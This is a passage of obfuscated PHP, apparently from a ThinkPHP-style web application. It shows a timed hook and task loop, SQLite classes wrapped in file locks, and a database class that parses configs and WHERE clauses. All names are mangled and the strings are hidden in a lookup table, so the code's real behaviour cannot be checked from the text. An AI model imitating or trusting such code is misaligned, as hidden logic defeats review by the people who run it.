(is_array($Ğ°ÙìÑô[$·’´ÛŒ¶])) { if (timeFloat() - $Ğ°ÙìÑô[$·’´ÛŒ¶][$¦¾¾şà[1886]] < $ş›Ë“÷‡[$¦¾¾şà[216]] * 0.3) { return; } $ş›Ë“÷‡[$¦¾¾şà[1887]] = $Ğ°ÙìÑô[$·’´ÛŒ¶][$¦¾¾şà[1887]]; } $Ğ°ÙìÑô[$·’´ÛŒ¶] = $ş›Ë“÷‡; Cache::set($ÍşÎß³, $Ğ°ÙìÑô, 60); Cache::removeMemory($ÍşÎß³); write_log($¦¾¾şà[1888] . $·’´ÛŒ¶ . $¦¾¾şà[84] . $Ç²§úé“, $¦¾¾şà[207]); } public static function timeLimitCallLoop() { $×ïºŞÚ =& $_SERVER[÷ôÚîå]; $Ø›‘ÉÍ = array($×ïºŞÚ[1889]); $ş¯åßÊ = in_array(strtolower(ACTION), $Ø›‘ÉÍ); if (!$ş¯åßÊ && !self::$asyncAdd) { return; } $ã·ÆÎÒÇ = $×ïºŞÚ[1885]; $ñŒØå¯Š = Cache::get($ã·ÆÎÒÇ, !0); if (!$ñŒØå¯Š || count($ñŒØå¯Š) <= 0) { return; } $Öê½áò = !1; $ËÓ¦²× = timeFloat(); $˜–‡ó¾ë = array(); foreach ($ñŒØå¯Š as $í®ù§Øş => $÷ŠéòêÜ) { if ($ËÓ¦²× - $÷ŠéòêÜ[$×ïºŞÚ[1887]] > $÷ŠéòêÜ[$×ïºŞÚ[216]]) { $Öê½áò = !0; try { Hook::apply($÷ŠéòêÜ[$×ïºŞÚ[350]], $÷ŠéòêÜ[$×ïºŞÚ[1877]]); write_log($×ïºŞÚ[1890] . $í®ù§Øş . $×ïºŞÚ[84] . $÷ŠéòêÜ[$×ïºŞÚ[350]] . $×ïºŞÚ[1891] . ACTION, $×ïºŞÚ[207]); } catch (Exception $ŞÕÀ™Ú·) { } continue; } $˜–‡ó¾ë[$í®ù§Øş] = $÷ŠéòêÜ; } if (!$Öê½áò) { return; } if (!$˜–‡ó¾ë) { return Cache::remove($ã·ÆÎÒÇ); } Cache::set($ã·ÆÎÒÇ, $˜–‡ó¾ë, 60); Cache::removeMemory($ã·ÆÎÒÇ); } public static function finished($…ÀÙ”ËÅ, $“¥Ç’éë) { $”şåÀ¡ß =& $_SERVER[÷ôÚîå]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($”şåÀ¡ß[350] => $…ÀÙ”ËÅ, $”şåÀ¡ß[1877] => $“¥Ç’éë); } private static function finishedRun() { $á€‹çñ£ =& $_SERVER[÷ôÚîå]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $³á…Í‚‚) { try { Hook::apply($³á…Í‚‚[$á€‹çñ£[350]], $³á…Í‚‚[$á€‹çñ£[1877]]); } catch (Exception $÷¾÷¶¬Ñ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto C¤É¢Ë‹‰ğ; CÈ×‹¥Ä¢: class DbSqlite extends DbSqliteBase { public function query($¯”²›¦¶) { $…¸†‹«Ø =& $_SERVER[÷ôÚîå]; if (!CacheLock::fileLock($…¸†‹«Ø[13])) { return !1; } $›û—Äˆ° = parent::query($¯”²›¦¶); CacheLock::fileUnLock($…¸†‹«Ø[13]); return $›û—Äˆ°; } public function execute($ƒğ†Ó¶) { $‘÷šÈÖ =& $_SERVER[÷ôÚîå]; if (!CacheLock::fileLock($‘÷šÈÖ[13])) { return !1; } $’Ë’—ßœ = parent::execute($ƒğ†Ó¶); CacheLock::fileUnLock($‘÷šÈÖ[13]); return $’Ë’—ßœ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ğàã¸ûÍ) { $ù‰Ë­Ğè =& $_SERVER[÷ôÚîå]; if (!CacheLock::fileLock($ù‰Ë­Ğè[13])) { return !1; } $§û©„…“ = parent::query($ğàã¸ûÍ); CacheLock::fileUnLock($ù‰Ë­Ğè[13]); return $§û©„…“; } public function execute($ØßÎ±Æû) { $ÑÍÈÁ±ğ =& $_SERVER[÷ôÚîå]; if (!CacheLock::fileLock($ÑÍÈÁ±ğ[13])) { return !1; } $­ÏşâïÜ = parent::execute($ØßÎ±Æû); CacheLock::fileUnLock($ÑÍÈÁ±ğ[13]); return $­ÏşâïÜ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\x71" => "\x3c\76", "\147\x74" => "\x3e", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\145\x6c\x74" => "\74\x3d", "\156\157\164\x6c\151\153\145" => "\x4e\x4f\x54\40\114\111\113\x45", "\154\151\153\x65" => "\114\111\x4b\105", "\151\x6e" => "\111\116", "\x6e\x6f\x74\x69\x6e" => "\116\117\x54\40\111\x4e", "\x6e\157\164\x20\x69\x6e" => "\116\x4f\124\40\111\x4e", "\142\x65\164\167\145\x65\x6e" => "\102\x45\x54\127\x45\105\x4e", "\156\x6f\x74\142\145\164\167\145\x65\x6e" => "\116\x4f\124\40\x42\x45\124\x57\x45\x45\116", "\156\157\164\x20\x62\145\164\167\x65\x65\x6e" => "\x4e\x4f\x54\40\102\x45\124\127\105\x45\x4e"); protected $selectSql = "\x53\105\114\105\x43\x54\45\x44\x49\123\x54\x49\116\103\x54\x25\40\45\x46\111\x45\114\x44\45\40\x46\x52\x4f\115\x20\x25\124\x41\x42\114\105\x25\45\112\117\111\x4e\45\x25\x57\x48\x45\x52\x45\x25\45\107\x52\x4f\125\120\x25\45\110\101\126\x49\x4e\107\45\x25\117\x52\x44\105\122\45\x25\x4c\x49\x4d\x49\x54\45\40\x25\125\x4e\x49\x4f\x4e\x25\x25\103\x4f\x4d\115\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $¢ùÛÄ¿ı = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[÷ôÚîå][1049], $¢ùÛÄ¿ı); } public function factory($è“¡›¹¾ = '') { $²Õƒª° =& $_SERVER[÷ôÚîå]; $è“¡›¹¾ = $this->parseConfig($è“¡›¹¾); if (empty($è“¡›¹¾[$²Õƒª°[1050]])) { think_exception(think_lang($²Õƒª°[1051])); } $this->dbType = ucwords(strtolower($è“¡›¹¾[$²Õƒª°[1050]])); $ËÔµò¦ë = $²Õƒª°[1052] . $this->dbType; if (class_exists($ËÔµò¦ë)) { $²†ªÏ¶µ = new $ËÔµò¦ë($è“¡›¹¾); if ($²Õƒª°[1053] != strtolower($è“¡›¹¾[$²Õƒª°[1050]])) { $²†ªÏ¶µ->dbType = strtoupper($this->dbType); } else { $²†ªÏ¶µ->dbType = $this->_getDsnType($è“¡›¹¾[$²Õƒª°[1005]]); } } else { think_exception(think_lang($²Õƒª°[1054]) . $²Õƒª°[1055] . $ËÔµò¦ë); } return $²†ªÏ¶µ; } public function __call($¦ï‹ãÔ, $âÛàÑı›) { if (method_exists($this, $¦ï‹ãÔ)) { return call_user_func_array(array($this, $¦ï‹ãÔ), $âÛàÑı›); } } protected function _getDsnType($­“™½ê) { $ÔûÂã¦¨ = explode($_SERVER[÷ôÚîå][4], $­“™½ê); $¯±‚°‡ = strtoupper(trim($ÔûÂã¦¨[0])); return $¯±‚°‡; } private function parseConfig($ïª¹½ş© = '') { $†¨ƒ‹æ¶ =& $_SERVER[÷ôÚîå]; if (!empty($ïª¹½ş©) && is_string($ïª¹½ş©)) { $ïª¹½ş© = $this->parseDSN($ïª¹½ş©); } elseif (is_array($ïª¹½ş©)) { $ïª¹½ş© = array_change_key_case($ïª¹½ş©); $ïª¹½ş© = array($†¨ƒ‹æ¶[1050] => $ïª¹½ş©[$†¨ƒ‹æ¶[1056]], $†¨ƒ‹æ¶[977] => $ïª¹½ş©[$†¨ƒ‹æ¶[1057]], $†¨ƒ‹æ¶[978] => $ïª¹½ş©[$†¨ƒ‹æ¶[1058]], $†¨ƒ‹æ¶[975] => $ïª¹½ş©[$†¨ƒ‹æ¶[1059]], $†¨ƒ‹æ¶[976] => $ïª¹½ş©[$†¨ƒ‹æ¶[1060]], $†¨ƒ‹æ¶[21] => $ïª¹½ş©[$†¨ƒ‹æ¶[1061]], $†¨ƒ‹æ¶[1005] => $ïª¹½ş©[$†¨ƒ‹æ¶[1062]], $†¨ƒ‹æ¶[17] => isset($ïª¹½ş©[$†¨ƒ‹æ¶[1063]]) ? $ïª¹½ş©[$†¨ƒ‹æ¶[1063]] : array()); } elseif (empty($ïª¹½ş©)) { if (think_config($†¨ƒ‹æ¶[1064]) && $†¨ƒ‹æ¶[1053] != strtolower(think_config($†¨ƒ‹æ¶[1065]))) { $ïª¹½ş© = $this->parseDSN(think_config($†¨ƒ‹æ¶[1064])); } else { $ïª¹½ş© = array($†¨ƒ‹æ¶[1050] => think_config($†¨ƒ‹æ¶[1065]), $†¨ƒ‹æ¶[977] => think_config($†¨ƒ‹æ¶[1066]), $†¨ƒ‹æ¶[978] => think_config($†¨ƒ‹æ¶[1067]), $†¨ƒ‹æ¶[975] => think_config($†¨ƒ‹æ¶[1068]), $†¨ƒ‹æ¶[976] => think_config($†¨ƒ‹æ¶[1069]), $†¨ƒ‹æ¶[21] => think_config($†¨ƒ‹æ¶[332]), $†¨ƒ‹æ¶[1005] => think_config($†¨ƒ‹æ¶[1064]), $†¨ƒ‹æ¶[17] => think_config($†¨ƒ‹æ¶[1070])); } } return $ïª¹½ş©; } protected function initConnect($å£”Ùö¹ = true) { if (1 == think_config($_SERVER[÷ôÚîå][22])) { $this->_linkID = $this->multiConnect($å£”Ùö¹); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ó‚Ù­Ãì => $ËÒşİ°ê) { $this->_linkID = $ËÒşİ°ê; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($şÁ¦Ú©ë = false) { $Â¿ò¶¬ı =& $_SERVER[÷ôÚîå]; static $²ÂÑ«»† = array(); static $‡Òşñ©ò = -1; if (empty($²ÂÑ«»†)) { foreach ($this->config as $‚âş§ => $ô¥ìš¿Ä) { $²ÂÑ«»†[$‚âş§] = explode($Â¿ò¶¬ı[50], $ô¥ìš¿Ä); } } if (think_config($Â¿ò¶¬ı[1071])) { if ($şÁ¦Ú©ë || think_config($Â¿ò¶¬ı[480]) === !0) { $­øøŠºÃ = floor(mt_rand(0, think_config($Â¿ò¶¬ı[1072]) - 1)); $‡Òşñ©ò = $­øøŠºÃ; } else { if (is_numeric(think_config($Â¿ò¶¬ı[1073]))) { $­øøŠºÃ = think_config($Â¿ò¶¬ı[1073]); } else { $­øøŠºÃ = floor(mt_rand(think_config($Â¿ò¶¬ı[1072]), count($²ÂÑ«»†[$Â¿ò¶¬ı[975]]) - 1)); } } } else { $­øøŠºÃ = floor(mt_rand(0, count($²ÂÑ«»†[$Â¿ò¶¬ı[975]]) - 1)); $‡Òşñ©ò = $­øøŠºÃ; } $­øøŠºÃ = $‡Òşñ©ò !== -1 ? $‡Òşñ©ò : $­øøŠºÃ; $›Á’¬ = array($Â¿ò¶¬ı[977] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[977]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[977]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[977]][0], $Â¿ò¶¬ı[978] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[978]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[978]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[978]][0], $Â¿ò¶¬ı[975] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[975]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[975]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[975]][0], $Â¿ò¶¬ı[976] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[976]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[976]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[976]][0], $Â¿ò¶¬ı[21] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[21]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[21]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[21]][0], $Â¿ò¶¬ı[1005] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[1005]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[1005]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[1005]][0], $Â¿ò¶¬ı[17] => isset($²ÂÑ«»†[$Â¿ò¶¬ı[17]][$­øøŠºÃ]) ? $²ÂÑ«»†[$Â¿ò¶¬ı[17]][$­øøŠºÃ] : $²ÂÑ«»†[$Â¿ò¶¬ı[17]][0]); return $this->connect($›Á’¬, $­øøŠºÃ); } public function parseDSN($€¸í÷) { $Ø¹à”ôÁ =& $_SERVER[÷ôÚîå]; if (empty($€¸í÷)) { return !1; } $É‹Ü’ş— = parse_url($€¸í÷); if ($É‹Ü’ş—[$Ø¹à”ôÁ[217]]) { $ãñÊ†ô¤ = array($Ø¹à”ôÁ[1050] => $É‹Ü’ş—[$Ø¹à”ôÁ[217]], $Ø¹à”ôÁ[977] => isset($É‹Ü’ş—[$Ø¹à”ôÁ[671]]) ? $É‹Ü’ş—[$Ø¹à”ôÁ[671]] : $Ø¹à”ôÁ[12], $Ø¹à”ôÁ[978] => isset($É‹Ü’ş—[$Ø¹à”ôÁ[1074]]) ? $É‹Ü’ş—[$Ø¹à”ôÁ[1074]] : $Ø¹à”ôÁ[12], $Ø¹à”ôÁ[975] => isset($É‹Ü’ş—[$Ø¹à”ôÁ[218]]) ? $É‹Ü’ş—[$Ø¹à”ôÁ[218]] : $Ø¹à”ôÁ[12], $Ø¹à”ôÁ[976] => isset($É‹Ü’ş—[$Ø¹à”ôÁ[219]]) ? $É‹Ü’ş—[$Ø¹à”ôÁ[219]] : $Ø¹à”ôÁ[12], $Ø¹à”ôÁ[21] => isset($É‹Ü’ş—[$Ø¹à”ôÁ[97]]) ? substr($É‹Ü’ş—[$Ø¹à”ôÁ[97]], 1) : $Ø¹à”ôÁ[12]); } else { preg_match($Ø¹à”ôÁ[1075], trim($€¸í÷), $•ßûºÎî); $ãñÊ†ô¤ = array($Ø¹à”ôÁ[1050] => $•ßûºÎî[1], $Ø¹à”ôÁ[977] => $•ßûºÎî[2], $Ø¹à”ôÁ[978] => $•ßûºÎî[3], $Ø¹à”ôÁ[975] => $•ßûºÎî[4], $Ø¹à”ôÁ[976] => $•ßûºÎî[5], $Ø¹à”ôÁ[21] => $•ßûºÎî[6]); } $ãñÊ†ô¤[$Ø¹à”ôÁ[1005]] = $Ø¹à”ôÁ[12]; return $ãñÊ†ô¤; } protected function debug() { $ööıÀ =& $_SERVER[÷ôÚîå]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ööıÀ[1076]; if (think_config($ööıÀ[1077])) { think_status($ööıÀ[1078]); think_trace($this->queryStr . $ööıÀ[1079] . think_status($ööıÀ[24], $ööıÀ[1078], 6) . $ööıÀ[1080], $ööıÀ[12], $ööıÀ[1081]); } } protected function parseLock($øõˆ¼î = false) { $ıèÛÈÎ’ =& $_SERVER[÷ôÚîå]; if (!$øõˆ¼î) { return $ıèÛÈÎ’[12]; } if ($ıèÛÈÎ’[1007] == $this->dbType) { return $ıèÛÈÎ’[1082]; } return $ıèÛÈÎ’[1083]; } protected function parseSet($Ã˜û«Æ¡) { $šÇ‹â“è =& $_SERVER[÷ôÚîå]; foreach ($Ã˜û«Æ¡ as $íÈÑ‹Ÿ => $é—±½Èµ) { if (is_array($é—±½Èµ) && $šÇ‹â“è[382] == $é—±½Èµ[0]) { $ñ™¶Œö[] = $this->parseKey($íÈÑ‹Ÿ) . $šÇ‹â“è[973] . $é—±½Èµ[1]; } elseif (is_scalar($é—±½Èµ) || is_null($é—±½Èµ)) { $ñ™¶Œö[] = $this->parseKey($íÈÑ‹Ÿ) . $šÇ‹â“è[973] . $this->parseValue($é—±½Èµ); } } return $šÇ‹â“è[1084] . implode($šÇ‹â“è[50], $ñ™¶Œö); } protected function bindParam($ó˜íö, $¿Ä°×‡) { $this->bind[$_SERVER[÷ôÚîå][4] . $ó˜íö] = $¿Ä°×‡; } protected function parseBind($’ú‚º“›) { $’ú‚º“› = array_merge($this->bind, $’ú‚º“›); $this->bind = array(); return $’ú‚º“›; } function parseKey(&$±ñûÓÑè, $‡×ßè® = true) { if ($‡×ßè®) { $±ñûÓÑè = $this->parseKeyCheck($±ñûÓÑè); } return $±ñûÓÑè; } function parseKeyCheck($ ÷ë×°Â) { $úÕİîÊ =& $_SERVER[÷ôÚîå]; $ ÷ë×°Â = trim($ ÷ë×°Â); if (!preg_match($úÕİîÊ[1085], $ ÷ë×°Â)) { think_exception($úÕİîÊ[1086] . $ ÷ë×°Â); } return $ ÷ë×°Â; } protected function parseValue($–ºÄÖ£€) { $öÁô¿™û =& $_SERVER[÷ôÚîå]; if (is_string($–ºÄÖ£€)) { $–ºÄÖ£€ = $öÁô¿™û[1046] . $this->escapeString($–ºÄÖ£€) . $öÁô¿™û[1046]; } elseif (isset($–ºÄÖ£€[0]) && is_string($–ºÄÖ£€[0]) && strtolower($–ºÄÖ£€[0]) == $öÁô¿™û[382]) { $–ºÄÖ£€ = $this->escapeString($–ºÄÖ£€[1]); } elseif (is_array($–ºÄÖ£€)) { $–ºÄÖ£€ = array_map(array($this, $öÁô¿™û[1047]), $–ºÄÖ£€); } elseif (is_bool($–ºÄÖ£€)) { $–ºÄÖ£€ = $–ºÄÖ£€ ? $öÁô¿™û[101] : $öÁô¿™û[238]; } elseif (is_null($–ºÄÖ£€)) { $–ºÄÖ£€ = $öÁô¿™û[116]; } return $–ºÄÖ£€; } protected function parseField($ÑåºšÔ¬) { $Ï‘Ò“‚¾ =& $_SERVER[÷ôÚîå]; if (is_string($ÑåºšÔ¬) && strpos($ÑåºšÔ¬, $Ï‘Ò“‚¾[50])) { $ÑåºšÔ¬ = explode($Ï‘Ò“‚¾[50], $ÑåºšÔ¬); } if (is_array($ÑåºšÔ¬)) { $•Ï·Øı = array(); foreach ($ÑåºšÔ¬ as $Ù¼ºàÕ• => $º¨»’¥²) { if (!is_numeric($Ù¼ºàÕ•)) { $•Ï·Øı[] = $this->parseKey($Ù¼ºàÕ•, !1) . $Ï‘Ò“‚¾[1087] . $this->parseKey($º¨»’¥²); } else { $•Ï·Øı[] = $this->parseKey($º¨»’¥²); } } $òìŸ©ø = implode($Ï‘Ò“‚¾[50], $•Ï·Øı); } elseif (is_string($ÑåºšÔ¬) && !empty($ÑåºšÔ¬)) { $òìŸ©ø = $ÑåºšÔ¬; } else { $òìŸ©ø = $Ï‘Ò“‚¾[230]; } return $òìŸ©ø; } protected function parseTable($Õ‰á½¾ù) { $®¦¯ò¡ =& $_SERVER[÷ôÚîå]; if (is_array($Õ‰á½¾ù)) { $‘¿§¿˜ = array(); foreach ($Õ‰á½¾ù as $“Û²Å => $¯ Áò¯È) { if (!is_numeric($“Û²Å)) { $‘¿§¿˜[] = $this->parseKey($“Û²Å) . $®¦¯ò¡[53] . $this->parseKey($¯ Áò¯È); } else { $‘¿§¿˜[] = $this->parseKey($“Û²Å); } } $Õ‰á½¾ù = $‘¿§¿˜; } elseif (is_string($Õ‰á½¾ù)) { if (strstr($Õ‰á½¾ù, $®¦¯ò¡[53])) { return $Õ‰á½¾ù; } $Õ‰á½¾ù = explode($®¦¯ò¡[50], $Õ‰á½¾ù); array_walk($Õ‰á½¾ù, array($this, $®¦¯ò¡[995])); } return $®¦¯ò¡[989] . trim(implode($®¦¯ò¡[1088], $Õ‰á½¾ù), $®¦¯ò¡[470]) . $®¦¯ò¡[989]; } protected function parseWhere($Œ¿ËÜÍø) { $–åîµ =& $_SERVER[÷ôÚîå]; $Ì§…¬²¤ = $–åîµ[12]; if (is_string($Œ¿ËÜÍø)) { $Ì§…¬²¤ = $Œ¿ËÜÍø; } else { $øé¥Ãò = isset($Œ¿ËÜÍø[$–åîµ[1089]]) ? strtoupper($Œ¿ËÜÍø[$–åîµ[1089]]) : $–åîµ[12]; if (in_array($øé¥Ãò, array($–åîµ[1090], $–åîµ[1091], $–åîµ[1092]))) { $øé¥Ãò = $–åîµ[53] . $øé¥Ãò . $–åîµ[53]; unset($Œ¿ËÜÍø[$–åîµ[1089]]); } else { $øé¥Ãò = $–åîµ[1093]; } foreach ($Œ¿ËÜÍø as $ÙÈœú‹ => $›Â´‡°¦) { $Ì§…¬²¤ .= $–åîµ[363]; if (is_numeric($ÙÈœú‹)) { $ÙÈœú‹ = $–åîµ[1094]; } if (0 === strpos($ÙÈœú‹, $–åîµ[11])) { $Ì§…¬²¤ .= $this->parseThinkWhere($ÙÈœú‹, $›Â´‡°¦); } else { if (!preg_match($–åîµ[1095], trim($ÙÈœú‹))) { think_exception(think_lang($–åîµ[1096]) . $–åîµ[4] . $ÙÈœú‹); } $±…ú®ØÀ = is_array($›Â´‡°¦) && isset($›Â´‡°¦[$–åîµ[1097]]); $ÙÈœú‹ = trim($ÙÈœú‹); if (strpos($ÙÈœú‹, $–åîµ[224])) { $ôÂ®öî³ = explode($–åîµ[224], $ÙÈœú‹); $×ä¯£í = array(); foreach ($ôÂ®öî³ as $¸µŠô±Ç => $êŒßôëˆ) { $ÏİŸÍª¶ = $±…ú®ØÀ ? $›Â´‡°¦[$¸µŠô±Ç] : $›Â´‡°¦; $×ä¯£í[] = $–åîµ[346] . $this->parseWhereItem($this->parseKey($êŒßôëˆ), $ÏİŸÍª¶) . $–åîµ[994]; } $Ì§…¬²¤ .= implode($–åîµ[1098], $×ä¯£í); } elseif (strpos($ÙÈœú‹, $–åîµ[369])) { $ôÂ®öî³ = explode($–åîµ[369], $ÙÈœú‹); $×ä¯£í = array(); foreach ($ôÂ®öî³ as $¸µŠô±Ç => $êŒßôëˆ) { $ÏİŸÍª¶ = $±…ú®ØÀ ? $›Â´‡°¦[$¸µŠô±Ç] : $›Â´‡°¦; $×ä¯£í[] = $–åîµ[346] . $this->parseWhereItem($this->parseKey($êŒßôëˆ), $ÏİŸÍª¶) . $–åîµ[994]; } $Ì§…¬²¤ .= implode($–åîµ[1093], $×ä¯£í); } else { $Ì§…¬²¤ .= $this->parseWhereItem($this->parseKey($ÙÈœú‹), $›Â´‡°¦); } } $Ì§…¬²¤ .= $–åîµ[364] . $øé¥Ãò; } $Ì§…¬²¤ = substr($Ì§…¬²¤, 0, -strlen($øé¥Ãò)); } return empty($Ì§…¬²¤) ? $–åîµ[12] : $–åîµ[1099] . $Ì§…¬²¤; } protected function parseWhereItem($šèÑÔš§, $•¾Ãöİ) { $œ§»ğ¢ =& $_SERVER[÷ôÚîå]; $ıÆíèÅû = $œ§»ğ¢[12]; if (is_array($•¾Ãöİ)) { if (is_string($•¾Ãöİ[0])) { $Œ°óªŞ = strtolower($•¾Ãöİ[0]); if (in_array($•¾Ãöİ[0], array($œ§»ğ¢[973], $œ§»ğ¢[1100], $œ§»ğ¢[1101], $œ§»ğ¢[1102], $œ§»ğ¢[1103], $œ§»ğ¢[1104]))) { $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[53] . $•¾Ãöİ[0] . $œ§»ğ¢[53] . $this->parseValue($•¾Ãöİ[1]); } elseif (preg_match($œ§»ğ¢[1105], $•¾Ãöİ[0])) { $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[53] . $this->parseValue($•¾Ãöİ[1]); } elseif (preg_match($œ§»ğ¢[1106], $•¾Ãöİ[0])) { if (is_array($•¾Ãöİ[1])) { $¹‰â¦‡ = isset($•¾Ãöİ[2]) ? strtoupper($•¾Ãöİ[2]) : $œ§»ğ¢[1091]; if (in_array($¹‰â¦‡, array($œ§»ğ¢[1090], $œ§»ğ¢[1091], $œ§»ğ¢[1092]))) { $ŞÀşÃè = array(); foreach ($•¾Ãöİ[1] as $Š´ğˆ¤) { $ŞÀşÃè[] = $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[53] . $this->parseValue($Š´ğˆ¤); } $ıÆíèÅû .= $œ§»ğ¢[346] . implode($œ§»ğ¢[53] . $¹‰â¦‡ . $œ§»ğ¢[53], $ŞÀşÃè) . $œ§»ğ¢[994]; } } else { $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[53] . $this->parseValue($•¾Ãöİ[1]); } } elseif ($œ§»ğ¢[382] == $Œ°óªŞ) { $ıÆíèÅû .= $œ§»ğ¢[992] . $šèÑÔš§ . $œ§»ğ¢[53] . $•¾Ãöİ[1] . $œ§»ğ¢[1107]; } elseif (preg_match($œ§»ğ¢[1108], $•¾Ãöİ[0])) { $ıÆíèÅû .= $•¾Ãöİ[0]; } elseif (preg_match($œ§»ğ¢[1109], $•¾Ãöİ[0])) { if (isset($•¾Ãöİ[2]) && $œ§»ğ¢[382] == $•¾Ãöİ[2]) { $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[53] . $•¾Ãöİ[1]; } else { if (is_string($•¾Ãöİ[1])) { $•¾Ãöİ[1] = explode($œ§»ğ¢[50], $•¾Ãöİ[1]); } $ššµ• = implode($œ§»ğ¢[50], $this->parseValue($•¾Ãöİ[1])); $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[992] . $ššµ• . $œ§»ğ¢[994]; } } elseif (preg_match($œ§»ğ¢[1110], $•¾Ãöİ[0])) { $Ã¤—úó = is_string($•¾Ãöİ[1]) ? explode($œ§»ğ¢[50], $•¾Ãöİ[1]) : $•¾Ãöİ[1]; $ıÆíèÅû .= $œ§»ğ¢[992] . $šèÑÔš§ . $œ§»ğ¢[53] . $this->exp[$Œ°óªŞ] . $œ§»ğ¢[53] . $this->parseValue($Ã¤—úó[0]) . $œ§»ğ¢[1093] . $this->parseValue($Ã¤—úó[1]) . $œ§»ğ¢[364]; } else { think_exception(think_lang($œ§»ğ¢[1096]) . $œ§»ğ¢[4] . $•¾Ãöİ[0]); } } else { $Å€›§“Ã = count($•¾Ãöİ); $á†ˆÄ²Ÿ = $œ§»ğ¢[12]; if (is_string($•¾Ãöİ[$Å€›§“Ã - 1])) { $á†ˆÄ²Ÿ = isset($•¾Ãöİ[$Å€›§“Ã - 1]) ? strtoupper($•¾Ãöİ[$Å€›§“Ã - 1]) : $œ§»ğ¢[12]; if (in_array($á†ˆÄ²Ÿ, array($œ§»ğ¢[1090], $œ§»ğ¢[1091], $œ§»ğ¢[1092]))) { $Å€›§“Ã = $Å€›§“Ã - 1; } } else { $á†ˆÄ²Ÿ = $œ§»ğ¢[1090]; } for ($ĞÍãˆäû = 0; $ĞÍãˆäû < $Å€›§“Ã; $ĞÍãˆäû++) { $Ã¤—úó = is_array($•¾Ãöİ[$ĞÍãˆäû]) ? $•¾Ãöİ[$ĞÍãˆäû][1] : $•¾Ãöİ[$ĞÍãˆäû]; if ($œ§»ğ¢[382] == strtolower($•¾Ãöİ[$ĞÍãˆäû][0])) { $ıÆíèÅû .= $œ§»ğ¢[346] . $šèÑÔš§ . $œ§»ğ¢[53] . $Ã¤—úó . $œ§»ğ¢[1107] . $á†ˆÄ²Ÿ . $œ§»ğ¢[53]; } else { $Ô¬¢¬Ô = is_array($•¾Ãöİ[$ĞÍãˆäû]) ? $this->exp[strtolower($•¾Ãöİ[$ĞÍãˆäû][0])] : $œ§»ğ¢[973]; if (!$Ô¬¢¬Ô && is_array($•¾Ãöİ[$ĞÍãˆäû]) && in_array($•¾Ãöİ[$ĞÍãˆäû][0], array($œ§»ğ¢[973], $œ§»ğ¢[1100], $œ§»ğ¢[1101], $œ§»ğ¢[1102], $œ§»ğ¢[1103], $œ§»ğ¢[1104]))) { $Ô¬¢¬Ô = $•¾Ãöİ[$ĞÍãˆäû][0]; } $ıÆíèÅû .= $œ§»ğ¢[346] . $šèÑÔš§ . $œ§»ğ¢[53] . $Ô¬¢¬Ô . $œ§»ğ¢[53] . $this->parseValue($Ã¤—úó) . $œ§»ğ¢[1107] . $á†ˆÄ²Ÿ . $œ§»ğ¢[53]; } } $ıÆíèÅû = substr($ıÆíèÅû, 0, -4); } } else { $ıÆíèÅû .= $šèÑÔš§ . $œ§»ğ¢[1111] . $this->parseValue($•¾Ãöİ); } return $ıÆíèÅû; } protected function parseThinkWhere($Şİ¸´Üˆ, $ŞÖ©öä) { $‘²¾›­˜ =& $_SERVER[÷ôÚîå]; $Úî¼œ = $‘²¾›­˜[12]; switch ($Şİ¸´Üˆ) { case $‘²¾›­˜[437]: $Úî¼œ = $ŞÖ©öä; break; case $‘²¾›­˜[1094]: $Úî¼œ = is_string($ŞÖ©öä) ? $ŞÖ©öä : substr($this->parseWhere($ŞÖ©öä), 6); break; case $‘²¾›­˜[1112]: parse_str($ŞÖ©öä, $æ»üæçã); if (isset($æ»üæçã[$‘²¾›­˜[1089]])) { 